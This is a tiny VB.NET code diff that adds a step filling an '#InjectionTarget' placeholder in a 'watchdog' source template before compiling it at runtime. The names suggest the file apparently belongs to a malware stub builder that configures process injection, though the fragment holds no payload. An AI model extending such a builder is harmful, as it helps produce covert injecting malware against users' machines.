@@ -91,6 +91,8 @@ Public Class Codedom
 
             Dim watchdogbuilder As New StringBuilder(Code)
 
+            watchdogbuilder.Replace("#InjectionTarget", F.InjectionTarget(0))
+
             ReplaceGlobals(watchdogbuilder)
 
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, watchdogbuilder.ToString())
